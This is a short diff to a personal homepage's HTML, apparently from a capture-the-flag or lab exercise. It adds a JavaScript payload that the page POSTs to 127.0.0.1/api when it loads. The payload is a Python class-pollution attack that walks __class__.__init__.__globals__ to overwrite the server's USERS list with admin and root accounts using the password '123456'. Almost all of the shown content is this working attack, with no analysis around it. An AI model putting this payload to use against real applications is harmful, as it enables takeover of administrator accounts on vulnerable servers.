@@ -8,12 +8,30 @@
     <h1>sky-tears的个人主页</h1>
     <h1>Hello ~</h1>
     <script>
+    var payload = {
+    "__class__": {
+        "__init__": {
+            "__globals__": {
+                "USERS": [
+                    {
+                        "username": "admin",
+                        "password": "123456"
+                    },
+                    {
+                        "username": "root",
+                        "password": "123456"
+                    }
+                ]
+            }
+        }
+    }
+};
     fetch('https://127.0.0.1/api', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json', // 设置请求头，根据需求调整
     },
-    body: JSON.stringify({ key: 'value' }) // 请求体，需转换为字符串
+    body: JSON.stringify(payload) // 请求体，需转换为字符串
 })
     .then(response => {
         if (!response.ok) {
